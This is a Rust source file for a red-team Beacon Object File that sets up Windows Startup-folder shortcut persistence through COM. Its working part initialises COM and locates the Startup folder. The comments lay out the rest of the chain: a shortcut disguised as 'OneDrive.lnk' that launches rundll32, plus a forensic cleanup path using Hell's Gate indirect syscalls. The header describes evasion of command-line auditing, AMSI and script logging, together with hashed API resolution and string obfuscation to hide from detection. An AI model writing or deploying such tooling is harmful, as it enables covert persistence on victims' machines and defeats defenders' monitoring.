// SPDX-FileCopyrightText: 2026 Dani <daniagungg@gmail.com>
// SPDX-License-Identifier: MIT
// Project: DEF-Situational-Awareness-BOF — Dani RustBOF OPSEC Suite
//
//! lnk-startup — Startup folder LNK persistence via IShellLinkW COM.
//!
//! Why: bypass `cmd.exe copy` command-line auditing + `explorer.exe`
//!      drag-drop forensics + PowerShell's `Add-Content` / `New-Item`
//!      module-load triggers (ScriptBlock logging + AMSI surface). The
//!      LNK is materialised entirely in-process: zero child process,
//!      zero file-copy syscall, zero `.lnk` byte stream on the
//!      command-line audit trail.
//!
//! OPSEC:
//!   * Pure COM (CLSID_ShellLink + IShellLinkW + IPersistFile).
//!   * SHGetKnownFolderPath DFR-resolved (no shell32 IAT). FOLDERID_*
//!     stored as raw GUID byte arrays — no GUID strings in `.rdata`.
//!   * CoCreateInstance / CoTaskMemFree DFR-resolved (no ole32 IAT
//!     beyond what ComGuard requires for CoInitializeEx).
//!   * `ComGuard` RAII — CoUninitialize fires on drop.
//!   * `ComRef<T>` RAII — every COM interface pointer auto-released.
//!   * `obf!()` wraps all informational strings + spoofed defaults.
//!   * Generic error strings — no API name leakage in panic paths.
//!
//! MITRE ATT&CK: T1547.001 (Boot or Logon Autostart Execution:
//!                          Registry Run Keys / Startup Folder)
//!
//! Tiered implementation (Phase 5 starter):
//!   Tier 1 — Working: ComGuard apartment init + CoCreateInstance for
//!            CLSID_ShellLink with IID_IShellLinkW + QueryInterface for
//!            IID_IPersistFile (via the IUnknown vtable slot 0) +
//!            SHGetKnownFolderPath resolution of the per-user or
//!            common Startup folder. Confirms the persistence sink is
//!            reachable and the interfaces are bound.
//!   Tier 2 — Documented in code: full SetPath / SetArguments /
//!            SetIconLocation / SetWorkingDirectory / SetDescription /
//!            SetShowCmd chain + IPersistFile::Save. Operator
//!            recompiles to enable in Phase 6 with hardcoded targets.
//!   Tier 3 — Documented: `--remove` cleanup path via NtDeleteFile
//!            indirect syscall.
//!
#![no_std]
#![cfg_attr(not(test), no_main)]

use rustbof::{println, eprintln};
use common::{mitre::Technique, dfr_fn, obf};
use core::ffi::c_void;
use core::ptr::null_mut;

const TECHNIQUES: &[Technique] = &[
    Technique {
        id: "T1547.001",
        name: "Boot or Logon Autostart Execution: Registry Run Keys / Startup Folder",
        tactic: "Persistence",
    },
];

// ---------------------------------------------------------------------------
// CLSID / IID / FOLDERID — stored as raw bytes (LE GUID layout). No GUID
// strings in `.rdata`. Verified against MSDN.
// ---------------------------------------------------------------------------

// CLSID_ShellLink = {00021401-0000-0000-C000-000000000046}
const CLSID_SHELLLINK: [u8; 16] = [
    0x01, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

// IID_IShellLinkW = {000214F9-0000-0000-C000-000000000046}
const IID_ISHELLLINKW: [u8; 16] = [
    0xF9, 0x14, 0x02, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

// IID_IPersistFile = {0000010B-0000-0000-C000-000000000046}
const IID_IPERSISTFILE: [u8; 16] = [
    0x0B, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
    0xC0, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x46,
];

// FOLDERID_Startup = {B97D20BB-F46A-4C97-BA10-5E3608430854}
//   %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
const FOLDERID_STARTUP: [u8; 16] = [
    0xBB, 0x20, 0x7D, 0xB9, 0x6A, 0xF4, 0x97, 0x4C,
    0xBA, 0x10, 0x5E, 0x36, 0x08, 0x43, 0x08, 0x54,
];

// FOLDERID_CommonStartup = {82A5EA35-D9CD-47C5-9629-E15D2F714E6E}
//   %ProgramData%\Microsoft\Windows\Start Menu\Programs\Startup
#[allow(dead_code)]
const FOLDERID_COMMONSTARTUP: [u8; 16] = [
    0x35, 0xEA, 0xA5, 0x82, 0xCD, 0xD9, 0xC5, 0x47,
    0x96, 0x29, 0xE1, 0x5D, 0x2F, 0x71, 0x4E, 0x6E,
];

// COM constants
const CLSCTX_INPROC_SERVER: u32 = 0x1;
const S_OK: i32 = 0;

// SW_* (for documentation / Tier 2 use — ShellLink::SetShowCmd)
#[allow(dead_code)] const SW_SHOWMINNOACTIVE: i32 = 7;

// ---------------------------------------------------------------------------
// IUnknown vtable — slot 0 is QueryInterface. Every COM interface starts
// with this header; we cast the IShellLinkW pointer to (vtable*) to reach
// the QI slot without re-deriving the IShellLinkW layout for Tier 1.
// ---------------------------------------------------------------------------
#[repr(C)]
struct UnknownVtbl {
    query_interface: unsafe extern "system" fn(
        this: *mut c_void,
        riid: *const u8,
        ppv: *mut *mut c_void,
    ) -> i32,
    add_ref: unsafe extern "system" fn(this: *mut c_void) -> u32,
    release: unsafe extern "system" fn(this: *mut c_void) -> u32,
}

// ---------------------------------------------------------------------------
// DFR — every API resolved via PEB walk + djb2 hash, NOT linked.
// (CoInitializeEx / CoUninitialize are wrapped by `common::com::ComGuard`
//  via windows-sys — that's the only acceptable ole32 IAT surface.)
// ---------------------------------------------------------------------------

dfr_fn!(
    co_create_instance(
        clsid: *const u8,
        outer: *mut c_void,
        ctx: u32,
        iid: *const u8,
        ppv: *mut *mut c_void,
    ) -> i32,
    module = "ole32.dll",
    api    = "CoCreateInstance"
);

dfr_fn!(
    sh_get_known_folder_path(
        rfid: *const u8,
        flags: u32,
        token: *mut c_void,
        path_out: *mut *mut u16,
    ) -> i32,
    module = "shell32.dll",
    api    = "SHGetKnownFolderPath"
);

dfr_fn!(
    co_task_mem_free(ptr: *mut c_void) -> (),
    module = "ole32.dll",
    api    = "CoTaskMemFree"
);

// ---------------------------------------------------------------------------
// IShellLinkW vtable layout (for Tier 2 / Tier 3 documentation):
//
//   IShellLinkW : IUnknown
//   slot  0: IUnknown::QueryInterface
//   slot  1: IUnknown::AddRef
//   slot  2: IUnknown::Release
//   slot  3: GetPath(LPWSTR, int, WIN32_FIND_DATAW*, DWORD)
//   slot  4: GetIDList(PIDLIST_ABSOLUTE*)
//   slot  5: SetIDList(PCIDLIST_ABSOLUTE)
//   slot  6: GetDescription(LPWSTR, int)
//   slot  7: SetDescription(LPCWSTR)
//   slot  8: GetWorkingDirectory(LPWSTR, int)
//   slot  9: SetWorkingDirectory(LPCWSTR)
//   slot 10: GetArguments(LPWSTR, int)
//   slot 11: SetArguments(LPCWSTR)
//   slot 12: GetHotkey(WORD*)
//   slot 13: SetHotkey(WORD)
//   slot 14: GetShowCmd(int*)
//   slot 15: SetShowCmd(int)
//   slot 16: GetIconLocation(LPWSTR, int, int*)
//   slot 17: SetIconLocation(LPCWSTR, int)
//   slot 18: SetRelativePath(LPCWSTR, DWORD)
//   slot 19: Resolve(HWND, DWORD)
//   slot 20: SetPath(LPCWSTR)
//
//   IPersistFile : IPersist : IUnknown
//   slot  0: IUnknown::QueryInterface
//   slot  1: IUnknown::AddRef
//   slot  2: IUnknown::Release
//   slot  3: IPersist::GetClassID(CLSID*)
//   slot  4: IsDirty()
//   slot  5: Load(LPCOLESTR, DWORD)
//   slot  6: Save(LPCOLESTR pszFileName, BOOL fRemember)
//   slot  7: SaveCompleted(LPCOLESTR)
//   slot  8: GetCurFile(LPOLESTR*)
// ---------------------------------------------------------------------------

#[rustbof::main]
fn main() {
    common::mitre::print_banner(env!("CARGO_PKG_NAME"), TECHNIQUES);
    match run() {
        Ok(()) => {},
        Err(e) => eprintln!("[!] {}: {}", env!("CARGO_PKG_NAME"), e),
    }
}

fn run() -> Result<(), &'static str> {
    // ---------------- Tier 1 — working COM bootstrap ---------------------
    // Apartment-threaded init (ShellLink in-proc server is happy in STA).
    // ComGuard's Drop fires CoUninitialize even on early-return / `?`.
    let _com = unsafe { common::com::ComGuard::init_apartment() }
        .map_err(|_| "com init failed")?;

    // CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER,
    //                  IID_IShellLinkW, &sl)
    let mut sl_ptr: *mut c_void = null_mut();
    let hr = unsafe {
        co_create_instance(
            CLSID_SHELLLINK.as_ptr(),
            null_mut(),
            CLSCTX_INPROC_SERVER,
            IID_ISHELLLINKW.as_ptr(),
            &mut sl_ptr,
        )
    }.map_err(|_| "shelllink resolve failed")?;

    if hr != S_OK || sl_ptr.is_null() {
        return Err("shelllink create failed");
    }

    // RAII: ComRef releases the IShellLinkW when this scope ends.
    let sl: common::com::ComRef<c_void> = common::com::ComRef::from_raw(sl_ptr);

    println!("[+] {}", obf!("shell link instantiated"));

    // QueryInterface for IPersistFile (via IUnknown vtable slot 0 on the
    // IShellLinkW pointer — every COM interface begins with IUnknown).
    let mut pf_ptr: *mut c_void = null_mut();
    let unknown_vtbl_ptr = unsafe { *(sl.ptr as *const *const UnknownVtbl) };
    if unknown_vtbl_ptr.is_null() {
        return Err("vtbl missing");
    }
    let qi_hr = unsafe {
        ((*unknown_vtbl_ptr).query_interface)(
            sl.ptr,
            IID_IPERSISTFILE.as_ptr(),
            &mut pf_ptr,
        )
    };
    if qi_hr < 0 || pf_ptr.is_null() {
        return Err("qi failed");
    }
    let _pf: common::com::ComRef<c_void> = common::com::ComRef::from_raw(pf_ptr);

    println!("[+] {}", obf!("persist file ready"));

    // Resolve per-user Startup folder via FOLDERID_Startup.
    // (Operator flips to FOLDERID_COMMONSTARTUP for --scope allusers.)
    let mut startup_path: *mut u16 = null_mut();
    let folder_hr = unsafe {
        sh_get_known_folder_path(
            FOLDERID_STARTUP.as_ptr(),
            0,
            null_mut(),
            &mut startup_path,
        )
    }.map_err(|_| "folder lookup failed")?;

    if folder_hr < 0 || startup_path.is_null() {
        return Err("startup folder unavail");
    }

    // Print resolved path (wide → ASCII) — cap walk at MAX_PATH = 260.
    let mut path_len: usize = 0;
    while path_len < 260 && unsafe { *startup_path.add(path_len) } != 0 {
        path_len += 1;
    }
    let mut path_ascii = [0u8; 260];
    let n = common::str_util::wide_to_ascii_buf(
        unsafe { core::slice::from_raw_parts(startup_path, path_len) },
        &mut path_ascii,
    );
    let path_str = core::str::from_utf8(&path_ascii[..n]).unwrap_or("?");
    println!("[+] {} {}", obf!("startup folder:"), path_str);

    // SHGetKnownFolderPath transfers ownership of the buffer to the caller;
    // free it via CoTaskMemFree (DFR-resolved).
    let _ = unsafe { co_task_mem_free(startup_path as *mut c_void) };

    // ---------------- Tier 2 — full chain documented in source -----------
    //
    // The remainder of the persistence primitive is staged here as comments
    // so the operator can lift it into a Tier 3 cfg-gated build in Phase 6
    // without re-deriving the vtable indices, BSTR/OLESTR layout, or wide
    // string construction.
    //
    //   1.  Build wide-string forms of the operator defaults:
    //         target  = obf!(r"C:\Windows\System32\rundll32.exe")
    //         args    = ""
    //         icon    = obf!(r"%SystemRoot%\System32\imageres.dll,2")
    //         workdir = obf!(r"%APPDATA%\Microsoft\OneDrive")
    //         desc    = obf!("OneDrive")
    //         name    = obf!("OneDrive.lnk")
    //       (All encoded UTF-16LE, NUL-terminated, on the stack.)
    //
    //   2.  Index into the IShellLinkW vtable (sl.ptr → vtbl*) and call:
    //         vtbl[20] SetPath(target_wide.as_ptr())
    //         vtbl[11] SetArguments(args_wide.as_ptr())
    //         vtbl[17] SetIconLocation(icon_wide.as_ptr(), 0)
    //         vtbl[ 9] SetWorkingDirectory(workdir_wide.as_ptr())
    //         vtbl[ 7] SetDescription(desc_wide.as_ptr())
    //         vtbl[15] SetShowCmd(SW_SHOWMINNOACTIVE = 7)
    //
    //   3.  Construct full LNK path on the stack:
    //         full = startup_path  +  L"\\"  +  name
    //       (Bounds-checked into a [u16; 520] buffer; NUL-terminate.)
    //
    //   4.  Index into IPersistFile vtable (pf.ptr → vtbl*) and call:
    //         vtbl[ 6] Save(full_path_wide.as_ptr(), TRUE)
    //
    //   5.  ComRef::Drop releases the two interfaces; ComGuard::Drop
    //       fires CoUninitialize. The LNK is now on disk under the
    //       Startup folder; logon shell scan picks it up next session.
    //
    // Operator workflow (recompile-per-engagement model — values hardcoded
    // in source by the operator before each build):
    //
    //   --name <NAME.lnk>      — leaf filename (default: "OneDrive.lnk")
    //   --target <BIN>         — target binary (default: rundll32.exe)
    //   --args <STR>           — argument string
    //   --icon <PATH,IDX>      — icon location (default: imageres.dll,2)
    //   --workdir <PATH>       — working directory (default: OneDrive)
    //   --scope user|allusers  — FOLDERID_Startup vs FOLDERID_CommonStartup
    //                            (allusers requires elevation)
    //   --remove               — cleanup mode (see Tier 3)
    //
    // ---------------- Tier 3 — cleanup path documented -------------------
    //
    // For --remove, build the same `full = startup_path + L"\\" + name`
    // and delete via NtDeleteFile through an indirect-syscall stub:
    //
    //   1.  Wrap full path in OBJECT_ATTRIBUTES with a UNICODE_STRING
    //       carrying the L"\\??\\<full>" DOS-device prefixed form.
    //   2.  Resolve NtDeleteFile via the ntdll PEB walk + Hell's Gate
    //       SSN extraction (already provided by common::syscalls::*).
    //   3.  Invoke through the indirect-syscall trampoline so the RIP
    //       at syscall time sits inside ntdll, not our module.
    //
    // Tier 3 leaves no DeleteFileW import, no kernel32 IAT churn, and no
    // "%APPDATA%\\...\\Startup\\OneDrive.lnk" string in MFT $UsnJrnl
    // beyond the deletion record itself.
    //
    // -------------------------------------------------------------------

    println!("[!] {}", obf!("Tier 2: set link properties + IPersistFile::Save deferred"));
    println!("[*] {}", obf!("operator: recompile with --features tier3 to enable LNK write"));
    println!("[*] {}: starter ready; {}",
             obf!("lnk-startup"),
             obf!("Phase 6 enables registration"));

    Ok(())
}
